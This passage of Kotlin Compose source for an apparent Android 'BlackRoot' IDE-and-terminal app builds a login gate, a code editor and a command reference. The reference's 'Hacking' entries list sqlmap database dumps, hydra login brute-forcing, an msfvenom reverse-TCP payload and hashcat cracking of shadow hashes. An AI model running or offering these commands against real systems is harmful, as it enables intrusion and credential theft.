                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.spacedBy(16.dp)
                            ) {
                                Button(
                                    onClick = {
                                        currentMode = AppMode.IDE
                                        showPasswordError = false
                                    },
                                    colors = ButtonDefaults.buttonColors(containerColor = DarkGrey),
                                    modifier = Modifier.weight(1f).testTag("cancel_login_button"),
                                    border = BorderStroke(1.dp, CyanBlue)
                                ) {
                                    Text("CANCEL", color = CyanBlue, fontFamily = FontFamily.Monospace)
                                }
                                
                                Button(
                                    onClick = {
                                        if (passwordInput == currentPassword) {
                                            unlockCli()
                                        } else {
                                            showPasswordError = true
                                            passwordInput = ""
                                            scope.launch {
                                                delay(1000)
                                                currentMode = AppMode.IDE
                                                showPasswordError = false
                                            }
                                        }
                                    },
                                    colors = ButtonDefaults.buttonColors(containerColor = CardGrey),
                                    modifier = Modifier.weight(1f).testTag("submit_login_button"),
                                    border = BorderStroke(1.dp, CyanBlue)
                                ) {
                                    Text("LOGIN", color = CyanBlue, fontFamily = FontFamily.Monospace)
                                }
                            }
                            

                        }
                    } else {
                        // TERMINAL CLIENT VIEW
                        Column(
                            modifier = Modifier
                                .fillMaxSize()
                                .padding(16.dp)
                        ) {
                            // Scrolling terminal log
                            LazyColumn(
                                state = terminalListState,
                                modifier = Modifier
                                    .weight(1f)
                                    .fillMaxWidth()
                                    .background(PitchBlack)
                                    .testTag("terminal_logs")
                            ) {
                                items(terminalLogs) { logItem ->
                                    val textColor = when (logItem.type) {
                                        LogType.INPUT -> NeonGreen
                                        LogType.SUCCESS -> ElectricLime
                                        LogType.ERROR -> BrightRed
                                        LogType.REPL -> CyanBlue
                                        LogType.SYSTEM -> AmberYellow
                                        LogType.INFO -> TextGreen
                                    }
                                    Text(
                                        text = logItem.text,
                                        color = textColor,
                                        fontSize = 12.sp,
                                        fontFamily = FontFamily.Monospace,
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .padding(vertical = 2.dp)
                                    )
                                }
                            }

                            // Active Background task indicator
                            activeCloneJob?.let { jobName ->
                                Row(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .padding(vertical = 4.dp)
                                        .background(DarkGreen)
                                        .border(1.dp, NeonGreen)
                                        .padding(8.dp),
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    CircularProgressIndicator(
                                        modifier = Modifier.size(16.dp),
                                        color = NeonGreen,
                                        strokeWidth = 2.dp
                                    )
                                    Spacer(modifier = Modifier.width(12.dp))
                                    Text(
                                        text = jobName,
                                        color = NeonGreen,
                                        fontSize = 11.sp,
                                        fontFamily = FontFamily.Monospace
                                    )
                                }
                            }

                            // Suggested Dynamic CLI Keywords & Commands Row
                            val cliKeywordsList = listOf(
                                "help", "ls", "clear", "pwd", "whoami", "python ", "node ", "git clone ", 
                                "git status", "git log", "git push", "git commit", "cat ", "pkg install "
                            )
                            val filteredCliSuggestions = remember(cliInput) {
                                if (cliInput.isEmpty()) {
                                    listOf("help", "ls", "clear", "whoami", "python welcome.py")
                                } else {
                                    cliKeywordsList.filter { it.contains(cliInput, ignoreCase = true) && it != cliInput }
                                }
                            }

                            if (filteredCliSuggestions.isNotEmpty()) {
                                Column(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .padding(vertical = 6.dp)
                                        .background(DarkGrey)
                                        .border(1.dp, CyanBlue, RoundedCornerShape(4.dp))
                                        .padding(horizontal = 8.dp, vertical = 6.dp)
                                ) {
                                    Row(
                                        modifier = Modifier.fillMaxWidth().padding(bottom = 4.dp),
                                        horizontalArrangement = Arrangement.SpaceBetween,
                                        verticalAlignment = Alignment.CenterVertically
                                    ) {
                                        Text(
                                            text = "CLI KEYWORDS & ASSISTANCE:",
                                            color = CyanBlue,
                                            fontSize = 9.sp,
                                            fontFamily = FontFamily.Monospace,
                                            fontWeight = FontWeight.Bold
                                        )
                                        if (cliInput.isNotEmpty()) {
                                            Text(
                                                text = "typing: '$cliInput'",
                                                color = AmberYellow,
                                                fontSize = 9.sp,
                                                fontFamily = FontFamily.Monospace
                                            )
                                        }
                                    }
                                    androidx.compose.foundation.lazy.LazyRow(
                                        horizontalArrangement = Arrangement.spacedBy(8.dp),
                                        modifier = Modifier.fillMaxWidth()
                                    ) {
                                        items(filteredCliSuggestions) { sug ->
                                            Box(
                                                modifier = Modifier
                                                    .background(CardGrey, RoundedCornerShape(4.dp))
                                                    .border(1.dp, CyanBlue, RoundedCornerShape(4.dp))
                                                    .clickable { cliInput = sug }
                                                    .padding(horizontal = 8.dp, vertical = 4.dp)
                                            ) {
                                                Text(
                                                    text = sug,
                                                    color = Color.White,
                                                    fontSize = 11.sp,
                                                    fontFamily = FontFamily.Monospace
                                                )
                                            }
                                        }
                                    }
                                }
                            }

                            // Terminal Input Panel
                            Row(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .border(1.dp, BorderGreen, RoundedCornerShape(4.dp))
                                    .background(DarkGrey)
                                    .padding(horizontal = 12.dp, vertical = 8.dp),
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Text(
                                    text = if (isReplMode) ">>> " else "root@system:~# ",
                                    color = if (isReplMode) CyanBlue else NeonGreen,
                                    style = TextStyle(fontFamily = FontFamily.Monospace, fontSize = 13.sp)
                                )
                                
                                BasicTextField(
                                    value = cliInput,
                                    onValueChange = { cliInput = it },
                                    modifier = Modifier
                                        .weight(1f)
                                        .testTag("terminal_input"),
                                    textStyle = TextStyle(
                                        color = if (isReplMode) CyanBlue else TextGreen,
                                        fontFamily = FontFamily.Monospace,
                                        fontSize = 13.sp
                                    ),
                                    cursorBrush = SolidColor(NeonGreen),
                                    keyboardOptions = KeyboardOptions(
                                        imeAction = ImeAction.Send
                                    ),
                                    keyboardActions = KeyboardActions(
                                        onSend = {
                                            if (cliInput.isNotEmpty()) {
                                                executeCommand(cliInput)
                                                cliInput = ""
                                            }
                                        }
                                    )
                                )

                                Icon(
                                    imageVector = Icons.Default.Send,
                                    contentDescription = "Send command",
                                    tint = NeonGreen,
                                    modifier = Modifier
                                        .size(24.dp)
                                        .clickable {
                                            if (cliInput.isNotEmpty()) {
                                                executeCommand(cliInput)
                                                cliInput = ""
                                            }
                                        }
                                        .testTag("send_command_button")
                                )
                            }
                        }
                    }
                }

                is AppMode.IDE -> {
                    // PROFESSIONAL CODING IDE VIEW
                    Column(
                        modifier = Modifier
                            .fillMaxSize()
                            .padding(12.dp)
                    ) {
                        // High-tech IDE graphic banner
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(80.dp)
                                .clip(RoundedCornerShape(6.dp))
                                .border(1.dp, CyanBlue, RoundedCornerShape(6.dp))
                        ) {
                            androidx.compose.foundation.Image(
                                painter = androidx.compose.ui.res.painterResource(id = R.drawable.img_ide_banner_1783409487971),
                                contentDescription = "BlackRoot IDE Banner",
                                modifier = Modifier.fillMaxSize(),
                                contentScale = androidx.compose.ui.layout.ContentScale.Crop
                            )
                            Box(
                                modifier = Modifier
                                    .fillMaxSize()
                                    .background(
                                        Brush.verticalGradient(
                                            colors = listOf(Color.Transparent, PitchBlack.copy(alpha = 0.7f))
                                        )
                                    )
                            )
                        }

                        Spacer(modifier = Modifier.height(10.dp))

                        // File management tabs & Search
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(bottom = 8.dp),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                text = "WORKSPACE",
                                color = CyanBlue,
                                style = MaterialTheme.typography.titleMedium,
                                fontWeight = FontWeight.Bold,
                                fontFamily = FontFamily.Monospace
                            )

                            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                Button(
                                    onClick = {
                                        newFileNameInput = ""
                                        showNewFileDialog = true
                                    },
                                    colors = ButtonDefaults.buttonColors(containerColor = DarkGreen),
                                    border = BorderStroke(1.dp, BorderGreen),
                                    contentPadding = PaddingValues(horizontal = 8.dp, vertical = 4.dp),
                                    modifier = Modifier.testTag("create_file_button")
                                ) {
                                    Icon(Icons.Default.Add, contentDescription = "New file creation", modifier = Modifier.size(16.dp), tint = NeonGreen)
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text("NEW FILE", color = NeonGreen, fontSize = 10.sp)
                                }

                                Button(
                                    onClick = {
                                        val pathToDelete = selectedFileRelativePath
                                        if (pathToDelete == "welcome.py" || pathToDelete == "welcome.txt") {
                                            Toast.makeText(context, "System files are read-only protected.", Toast.LENGTH_SHORT).show()
                                        } else {
                                            workspaceManager.deleteFile(pathToDelete)
                                            refreshWorkspace()
                                            selectedFileRelativePath = filesList.firstOrNull()?.relativePath ?: ""
                                            Toast.makeText(context, "Deleted '$pathToDelete'", Toast.LENGTH_SHORT).show()
                                        }
                                    },
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0x33FF3333)),
                                    border = BorderStroke(1.dp, BrightRed),
                                    contentPadding = PaddingValues(horizontal = 8.dp, vertical = 4.dp),
                                    modifier = Modifier.testTag("delete_file_button")
                                ) {
                                    Icon(Icons.Default.Delete, contentDescription = "Wipe Current File", modifier = Modifier.size(16.dp), tint = BrightRed)
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text("WIPE", color = BrightRed, fontSize = 10.sp)
                                }
                            }
                        }

                        // Files Tab list
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(42.dp)
                                .background(DarkGrey)
                                .border(1.dp, BorderGreen, RoundedCornerShape(4.dp))
                                .padding(horizontal = 4.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            LazyColumn(
                                modifier = Modifier.fillMaxHeight(),
                                userScrollEnabled = true
                            ) {
                                item {
                                    Row(
                                        modifier = Modifier.fillMaxHeight(),
                                        verticalAlignment = Alignment.CenterVertically,
                                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                                    ) {
                                        filesList.forEach { wFile ->
                                            val isSelected = wFile.relativePath == selectedFileRelativePath
                                            Box(
                                                modifier = Modifier
                                                    .background(if (isSelected) DarkGreen else Color.Transparent, RoundedCornerShape(4.dp))
                                                    .border(1.dp, if (isSelected) NeonGreen else Color.Transparent, RoundedCornerShape(4.dp))
                                                    .clickable { selectedFileRelativePath = wFile.relativePath }
                                                    .padding(horizontal = 8.dp, vertical = 4.dp)
                                                    .testTag("file_tab_${wFile.relativePath.replace(".", "_")}")
                                            ) {
                                                val hasIconPack = installedExtensions.contains("icon_pack")
                                                val (icon, extColor) = getFileIconAndColor(wFile.name, hasIconPack)
                                                Row(verticalAlignment = Alignment.CenterVertically) {
                                                    Text(text = "$icon ", fontSize = 11.sp)
                                                    Text(
                                                        text = wFile.name,
                                                        color = if (isSelected) NeonGreen else extColor,
                                                        fontSize = 11.sp,
                                                        fontFamily = FontFamily.Monospace,
                                                        fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Normal
                                                    )
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }

                        Spacer(modifier = Modifier.height(10.dp))

                        // IDE Code Canvas with Line Numbers
                        Box(
                            modifier = Modifier
                                .weight(1f)
                                .fillMaxWidth()
                                .border(1.dp, BorderGreen, RoundedCornerShape(4.dp))
                                .background(DarkGrey)
                        ) {
                            Row(modifier = Modifier.fillMaxSize()) {
                                // Draw Line Numbers based on text line count
                                val lineCount = fileContentState.text.split("\n").size
                                Column(
                                    modifier = Modifier
                                        .fillMaxHeight()
                                        .background(PitchBlack)
                                        .padding(vertical = 12.dp, horizontal = 8.dp),
                                    horizontalAlignment = Alignment.End
                                ) {
                                    for (ln in 1..kotlin.math.max(lineCount, 1)) {
                                        Text(
                                            text = ln.toString(),
                                            color = BorderGreen,
                                            fontSize = 11.sp,
                                            fontFamily = FontFamily.Monospace,
                                            lineHeight = 18.sp
                                        )
                                    }
                                }

                                VerticalDivider(
                                    color = BorderGreen,
                                    thickness = 1.dp,
                                    modifier = Modifier.fillMaxHeight()
                                )

                                // Interactive Code Text Field
                                BasicTextField(
                                    value = fileContentState,
                                    onValueChange = { fileContentState = it },
                                    modifier = Modifier
                                        .weight(1f)
                                        .fillMaxHeight()
                                        .padding(12.dp)
                                        .testTag("code_editor_field"),
                                    textStyle = TextStyle(
                                        color = TextGreen,
                                        fontFamily = FontFamily.Monospace,
                                        fontSize = 12.sp,
                                        lineHeight = 18.sp
                                    ),
                                    cursorBrush = SolidColor(NeonGreen),
                                    // Visual highlight wrapper
                                    visualTransformation = { text ->
                                        TransformedText(
                                            highlightCode(text.text, selectedFileRelativePath),
                                            androidx.compose.ui.text.input.OffsetMapping.Identity
                                        )
                                    }
                                )
                            }
                        }

                        // Dynamic Code Keyword Auto-Complete Suggestions Bar
                        val ext = selectedFileRelativePath.substringAfterLast(".").lowercase()
                        val pythonKeywords = listOf("def ", "class ", "import ", "from ", "if ", "else:", "elif ", "for ", "while ", "print(", "return ", "try:", "except:", "True", "False", "None")
                        val jsKeywords = listOf("const ", "let ", "var ", "function ", "return ", "if ", "else ", "console.log(", "import ", "export ", "class ", "true", "false", "null", "async ", "await ")
                        val htmlKeywords = listOf("<div>", "</div>", "<p>", "</p>", "<h1>", "</h1>", "<html>", "</html>", "<body>", "</body>", "<head>", "</head>", "<style>", "</style>", "<script>", "</script>", "<span>", "</span>", "<button>", "</button>", "<input ")
                        val generalKeywords = listOf("if ", "else ", "for ", "while ", "return ", "true", "false")

                        val currentText = fileContentState.text
                        val cursorPosition = fileContentState.selection.end
                        val textBeforeCursor = if (cursorPosition in 1..currentText.length) {
                            currentText.substring(0, cursorPosition)
                        } else {
                            ""
                        }
                        val lastWord = textBeforeCursor.split(Regex("[^a-zA-Z0-9_<>/.-]")).lastOrNull() ?: ""

                        val matchingKeywords = remember(lastWord, ext) {
                            val list = when (ext) {
                                "py" -> pythonKeywords
                                "js", "ts" -> jsKeywords
                                "html", "htm" -> htmlKeywords
                                else -> generalKeywords
                            }
                            if (lastWord.isEmpty()) {
                                list.take(6)
                            } else {
                                list.filter { it.trim().contains(lastWord, ignoreCase = true) && it.trim() != lastWord }
                            }
                        }

                        if (matchingKeywords.isNotEmpty()) {
                            Column(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(vertical = 4.dp)
                                    .background(DarkGrey)
                                    .border(1.dp, CyanBlue, RoundedCornerShape(4.dp))
                                    .padding(6.dp)
                            ) {
                                Row(
                                    modifier = Modifier.fillMaxWidth().padding(bottom = 4.dp),
                                    horizontalArrangement = Arrangement.SpaceBetween,
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Text(
                                        text = "AUTO-COMPLETE SUGGESTIONS (TAP TO FINISH TYPE):",
                                        color = CyanBlue,
                                        fontSize = 9.sp,
                                        fontFamily = FontFamily.Monospace,
                                        fontWeight = FontWeight.Bold
                                    )
                                    if (lastWord.isNotEmpty()) {
                                        Text(
                                            text = "typing: '$lastWord'",
                                            color = AmberYellow,
                                            fontSize = 9.sp,
                                            fontFamily = FontFamily.Monospace
                                        )
                                    }
                                }
                                androidx.compose.foundation.lazy.LazyRow(
                                    horizontalArrangement = Arrangement.spacedBy(6.dp),
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    items(matchingKeywords) { kw ->
                                        Box(
                                            modifier = Modifier
                                                .background(CardGrey, RoundedCornerShape(4.dp))
                                                .border(1.dp, CyanBlue, RoundedCornerShape(4.dp))
                                                .clickable {
                                                    val textAfterCursor = if (cursorPosition in 0 until currentText.length) {
                                                        currentText.substring(cursorPosition)
                                                    } else {
                                                        ""
                                                    }
                                                    val lastWordStart = textBeforeCursor.lastIndexOf(lastWord)
                                                    if (lastWordStart >= 0) {
                                                        val newTextBefore = textBeforeCursor.substring(0, lastWordStart) + kw
                                                        val newText = newTextBefore + textAfterCursor
                                                        fileContentState = TextFieldValue(
                                                            text = newText,
                                                            selection = androidx.compose.ui.text.TextRange(newTextBefore.length)
                                                        )
                                                    }
                                                }
                                                .padding(horizontal = 8.dp, vertical = 4.dp)
                                        ) {
                                            Text(
                                                text = kw,
                                                color = Color.White,
                                                fontSize = 11.sp,
                                                fontFamily = FontFamily.Monospace
                                            )
                                        }
                                    }
                                }
                            }
                        }

                        // Programmers Ribbon actions bar
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(vertical = 4.dp)
                                .background(PitchBlack)
                                .border(1.dp, BorderGreen, RoundedCornerShape(4.dp))
                                .padding(horizontal = 6.dp, vertical = 6.dp),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            val ribbonKeys = listOf("Tab", ":", "()", "=", "+", "\"")
                            LazyColumn(
                                modifier = Modifier.height(36.dp),
                                userScrollEnabled = true
                            ) {
                                item {
                                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                        ribbonKeys.forEach { key ->
                                            Box(
                                                modifier = Modifier
                                                    .background(DarkGrey, RoundedCornerShape(4.dp))
                                                    .border(1.dp, BorderGreen, RoundedCornerShape(4.dp))
                                                    .clickable {
                                                        val insertText = when (key) {
                                                            "Tab" -> "    "
                                                            "()" -> "()"
                                                            "\"" -> "\"\""
                                                            else -> key
                                                        }
                                                        val currentTextStr = fileContentState.text
                                                        val selectionStart = fileContentState.selection.start
                                                        val newText = currentTextStr.substring(0, selectionStart) + insertText + currentTextStr.substring(fileContentState.selection.end)
                                                        fileContentState = TextFieldValue(
                                                            text = newText,
                                                            selection = androidx.compose.ui.text.TextRange(selectionStart + insertText.length)
                                                        )
                                                    }
                                                    .padding(horizontal = 12.dp, vertical = 6.dp)
                                            ) {
                                                Text(
                                                    text = key,
                                                    color = NeonGreen,
                                                    fontSize = 11.sp,
                                                    fontFamily = FontFamily.Monospace,
                                                    fontWeight = FontWeight.Bold
                                                )
                                            }
                                        }
                                    }
                                }
                            }
                        }

                        // Auto-Save control row if autosave is installed
                        if (installedExtensions.contains("autosave")) {
                            Row(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(vertical = 4.dp),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Row(verticalAlignment = Alignment.CenterVertically) {
                                    Icon(
                                        imageVector = Icons.Default.Autorenew,
                                        contentDescription = "Auto Save Daemon",
                                        tint = if (isAutoSaveEnabled) NeonGreen else BorderGreen,
                                        modifier = Modifier.size(16.dp)
                                    )
                                    Spacer(modifier = Modifier.width(6.dp))
                                    Text(
                                        text = "AUTO-SAVE STATUS: $isAutoSavingStatus",
                                        color = if (isAutoSaveEnabled) NeonGreen else BorderGreen,
                                        fontSize = 11.sp,
                                        fontFamily = FontFamily.Monospace
                                    )
                                }
                                Switch(
                                    checked = isAutoSaveEnabled,
                                    onCheckedChange = { isAutoSaveEnabled = it },
                                    colors = SwitchDefaults.colors(
                                        checkedThumbColor = NeonGreen,
                                        checkedTrackColor = DarkGreen,
                                        uncheckedThumbColor = Color.Gray,
                                        uncheckedTrackColor = DarkGrey
                                    )
                                )
                            }
                        }

                        // Actions Panel: SAVE, FORMAT, RUN
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Button(
                                onClick = {
                                    workspaceManager.writeFile(selectedFileRelativePath, fileContentState.text)
                                    refreshWorkspace()
                                    Toast.makeText(context, "Saved changes to '$selectedFileRelativePath'", Toast.LENGTH_SHORT).show()
                                },
                                modifier = Modifier
                                    .weight(1f)
                                    .testTag("save_file_button"),
                                colors = ButtonDefaults.buttonColors(containerColor = DarkGrey),
                                border = BorderStroke(1.dp, CyanBlue),
                                contentPadding = PaddingValues(horizontal = 4.dp, vertical = 6.dp)
                            ) {
                                Icon(Icons.Default.Save, contentDescription = "Save file", tint = CyanBlue, modifier = Modifier.size(16.dp))
                                Spacer(modifier = Modifier.width(4.dp))
                                Text("SAVE", color = CyanBlue, fontWeight = FontWeight.Bold, fontSize = 11.sp)
                            }

                            if (installedExtensions.contains("prettier")) {
                                Button(
                                    onClick = {
                                        val formatted = prettierFormatter.format(fileContentState.text, selectedFileRelativePath)
                                        fileContentState = TextFieldValue(formatted)
                                        workspaceManager.writeFile(selectedFileRelativePath, formatted)
                                        refreshWorkspace()
                                        Toast.makeText(context, "Formatted with Prettier!", Toast.LENGTH_SHORT).show()
                                    },
                                    modifier = Modifier
                                        .weight(1f)
                                        .testTag("format_file_button"),
                                    colors = ButtonDefaults.buttonColors(containerColor = DarkGrey),
                                    border = BorderStroke(1.dp, GhostGreen),
                                    contentPadding = PaddingValues(horizontal = 4.dp, vertical = 6.dp)
                                ) {
                                    Icon(Icons.Default.Build, contentDescription = "Prettier Format", tint = GhostGreen, modifier = Modifier.size(16.dp))
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text("PRETTIER", color = GhostGreen, fontWeight = FontWeight.Bold, fontSize = 11.sp)
                                }
                            }

                            val extName = selectedFileRelativePath.substringAfterLast(".").lowercase()
                            val runButtonText = when (extName) {
                                "py" -> "RUN PYTHON"
                                "js", "ts" -> "RUN NODE"
                                "html", "htm" -> "WEB PREVIEW"
                                else -> "RUN SCRIPT"
                            }
                            val runIcon = if (extName == "html" || extName == "htm") Icons.Default.Language else Icons.Default.PlayArrow

                            Button(
                                onClick = {
                                    // Save then execute based on type
                                    workspaceManager.writeFile(selectedFileRelativePath, fileContentState.text)
                                    refreshWorkspace()
                                    if (extName == "html" || extName == "htm") {
                                        currentMode = AppMode.WebPreview
                                    } else if (extName == "js" || extName == "ts") {
                                        currentMode = AppMode.Terminal
                                        executeCommand("node $selectedFileRelativePath")
                                    } else {
                                        currentMode = AppMode.Terminal
                                        executeCommand("python $selectedFileRelativePath")
                                    }
                                },
                                modifier = Modifier
                                    .weight(1.2f)
                                    .testTag("run_file_button"),
                                colors = ButtonDefaults.buttonColors(containerColor = DarkGrey),
                                border = BorderStroke(1.dp, NeonGreen),
                                contentPadding = PaddingValues(horizontal = 4.dp, vertical = 6.dp)
                            ) {
                                Icon(runIcon, contentDescription = "Run current script", tint = NeonGreen, modifier = Modifier.size(16.dp))
                                Spacer(modifier = Modifier.width(4.dp))
                                Text(runButtonText, color = NeonGreen, fontWeight = FontWeight.Bold, fontSize = 11.sp)
                            }
                        }
                    }
                }

                is AppMode.Extensions -> {
                    var storeSubTab by remember { mutableStateOf("extensions") }
                    var commandSearchQuery by remember { mutableStateOf("") }
                    var selectedCommandCategory by remember { mutableStateOf("All") }

                    val commandsList = remember {
                        listOf(
                            CliCommandItem("help", "System", "View all standard integrated commands available in the BlackRoot shell."),
                            CliCommandItem("whoami", "System", "Retrieve information about the current logged-in session, user privilege levels, and sandbox environment."),
                            CliCommandItem("pwd", "System", "Print the absolute directory path of the active workspace environment."),
                            CliCommandItem("clear", "System", "Purge the terminal visual log registers to clean up the screen canvas."),
                            CliCommandItem("ls -la", "System", "Display a detailed list of all files in the current folder, including hidden system files and permissions."),
                            CliCommandItem("cat welcome.py", "System", "Inspect raw text contents of the main 'welcome.py' startup script."),
                            CliCommandItem("python welcome.py", "System", "Compile and execute the welcome Python script in the virtual interpreter."),
                            CliCommandItem("node script.js", "System", "Invoke the NodeJS virtual machine to execute dynamic JavaScript code."),
                            CliCommandItem("passwd", "System", "Change the active security gate password to protect the terminal environment."),
                            CliCommandItem("history", "System", "Display a complete log of all executed commands in the current session."),
                            CliCommandItem("uname -a", "System", "Query detailed virtual operating system metadata, kernel version, and architecture."),
                            CliCommandItem("df -h", "System", "Check overall disk space utilization in human-readable megabytes and gigabytes."),
                            CliCommandItem("free -m", "System", "View real-time system memory usage, including total, used, and free RAM allocations."),
                            CliCommandItem("top", "System", "Launch a real-time system resource monitor to inspect active background processor tasks."),
                            CliCommandItem("ps aux", "System", "List all running OS processes with owner usernames, CPU, and memory indicators."),
                            CliCommandItem("kill -9 1024", "System", "Force terminate a hanging process using its unique process identifier (PID 1024)."),
                            CliCommandItem("id", "System", "Display active user identities, primary group identifiers, and privilege permissions."),
                            CliCommandItem("env", "System", "List all active environmental configurations and terminal setup parameters."),
                            CliCommandItem("echo \$PATH", "System", "Print binary execution lookup paths defined in the system registry."),
                            CliCommandItem("exit", "System", "Close the current active terminal session and lock access credentials."),

                            CliCommandItem("pkg install nmap", "Setup", "Download and register the advanced Network Mapper scanner suite in the local bin path."),
                            CliCommandItem("pkg install curl", "Setup", "Install the universal command-line client for transferring data over internet protocols."),
                            CliCommandItem("pkg install hydra", "Setup", "Acquire the multi-protocol parallelized login brute-forcer inside the shell toolkit."),
                            CliCommandItem("pkg install sqlmap", "Setup", "Deploy the automated SQL injection and database exploitation engine."),
                            CliCommandItem("pkg update", "Setup", "Synchronize the package repository lists and refresh package definitions."),
                            CliCommandItem("pkg list", "Setup", "Display all locally installed package compilers and visual extensions."),
                            CliCommandItem("pkg uninstall prettier", "Setup", "Purge the Prettier auto-formatter engine and remove its local visual profiles."),
                            CliCommandItem("pkg upgrade -y", "Setup", "Automatically download and apply updates to all registered system utilities."),
                            CliCommandItem("alias ll=\"ls -l\"", "Setup", "Define a shortcut 'll' to list files with extended metadata."),
                            CliCommandItem("export DEBIAN_FRONTEND=noninteractive", "Setup", "Set environment variables to run installation processes silently without user interaction prompts."),

                            CliCommandItem("nmap -sS -O 192.168.1.1", "Network", "Conduct a stealth TCP SYN scan to map active ports and discover target OS details."),
                            CliCommandItem("nmap -p 80,443,8080 -sV 10.0.0.5", "Network", "Detect specific version headers of web services running on typical HTTP ports."),
                            CliCommandItem("nmap -T4 -A target.com", "Network", "Initiate an aggressive scan with OS detection, version scanning, script scanning, and traceroute enabled."),
                            CliCommandItem("nmap --script vuln target.com", "Network", "Run automated NSE scripts to identify known critical vulnerabilities on target systems."),
                            CliCommandItem("ping -c 4 google.com", "Network", "Transmit 4 ICMP echo request packets to verify host reachability and round-trip latency."),
                            CliCommandItem("whois blackroot.org", "Network", "Query public WHOIS registries to extract registrar info, owner email, and domain registration dates."),
                            CliCommandItem("dig blackroot.org MX", "Network", "Resolve Domain Name System mail exchanger records to locate the target's email servers."),
                            CliCommandItem("nslookup target.com", "Network", "Query default DNS name servers to locate IP addresses associated with target domain."),
                            CliCommandItem("traceroute target.com", "Network", "Trace the hop-by-hop packet network path towards the target host interface."),
                            CliCommandItem("ifconfig", "Network", "Display configuration states and active IP details of all local network cards."),
                            CliCommandItem("netstat -tuln", "Network", "Audit active listening TCP/UDP sockets and port allocations on the local machine."),
                            CliCommandItem("arp -a", "Network", "List the physical MAC-to-IP address mapping resolutions in the local ARP cache table."),
                            CliCommandItem("ssh admin@192.168.1.50 -p 22", "Network", "Establish an encrypted secure shell session to a remote host as administrator on port 22."),
                            CliCommandItem("scp backup.zip admin@192.168.1.50:/tmp", "Network", "Securely copy a local zip archive to the temp directory of a remote SSH server."),
                            CliCommandItem("nc -zv 192.168.1.1 1-1000", "Network", "Perform a fast port scan of the first 1000 TCP ports on the target host using Netcat."),
                            CliCommandItem("tcpdump -i eth0 -vv -c 10", "Network", "Capture 10 detailed network packets flowing through the primary ethernet interface."),
                            CliCommandItem("route -n", "Network", "Inspect the current kernel routing tables and gateway configurations."),
                            CliCommandItem("iptables -L -n -v", "Network", "List all active firewall rules, chain configurations, and packet filter counts."),
                            CliCommandItem("lsof -i :8080", "Network", "Identify the exact process identifier binding to active port 8080."),
                            CliCommandItem("dig @8.8.8.8 target.com TXT", "Network", "Perform a text DNS record query using Google Public DNS servers to check SPF or security tags."),

                            CliCommandItem("sqlmap -u \"http://target/v.php?id=1\" --dbs", "Hacking", "Automatically scan a target web parameter and dump accessible databases."),
                            CliCommandItem("sqlmap -u \"http://target/v.php?id=1\" -D app --tables", "Hacking", "Enumerate database tables inside the specific database named 'app'."),
                            CliCommandItem("sqlmap -u \"http://target/v.php?id=1\" -T users --dump", "Hacking", "Dump all records and credentials stored inside the 'users' data table."),
                            CliCommandItem("hydra -l admin -P passlist.txt ssh://192.168.1.5", "Hacking", "Conduct a multi-threaded brute force attack against SSH on target using a password wordlist."),
                            CliCommandItem("hydra -L users.txt -p password ftp://192.168.1.5", "Hacking", "Test the password 'password' against multiple FTP accounts in a username list."),
                            CliCommandItem("hydra -l root -P pass.txt rdp://192.168.1.5", "Hacking", "Perform brute force authentication attempts against Remote Desktop Protocol as root."),
                            CliCommandItem("msfconsole", "Hacking", "Open the Metasploit Framework interactive console to manage exploits, payloads, and post-modules."),
                            CliCommandItem("msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > payload.exe", "Hacking", "Generate a custom reverse-TCP Meterpreter executable payload for Windows targets."),
                            CliCommandItem("searchsploit wordpress 5.0", "Hacking", "Search the Exploit Database offline archive for WordPress 5.0 exploit codes."),
                            CliCommandItem("nikto -h http://target.com", "Hacking", "Run an automated web server scanner to detect dangerous files, outdated servers, and CGIs."),
                            CliCommandItem("gobuster dir -u http://target.com -w common_wordlist.txt", "Hacking", "Brute-force discover hidden files and directories on a web target using a local dictionary."),
                            CliCommandItem("wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ", "Hacking", "Fuzz HTTP directories, parameters, and paths while hiding 404 response errors."),
                            CliCommandItem("john --wordlist=passwords.txt hashes.txt", "Hacking", "Crack raw target hash strings using a specified password wordlist with John the Ripper."),
                            CliCommandItem("hashcat -m 0 MD5_hashes.txt wordlist.txt", "Hacking", "Run high-performance GPU/CPU cracking of raw MD5 hashes (mode 0) using a dictionary."),
                            CliCommandItem("hashcat -m 1800 shadow_hashes.txt wordlist.txt", "Hacking", "Attempt to crack SHA-512 crypt Unix shadow file password hashes (mode 1800)."),
                            CliCommandItem("amass enum -d target.com", "Hacking", "Execute domain enumeration using active and passive data gathering techniques."),
                            CliCommandItem("subfinder -d target.com -silent", "Hacking", "Discover valid subdomains for a target domain using fast, passive web sources."),
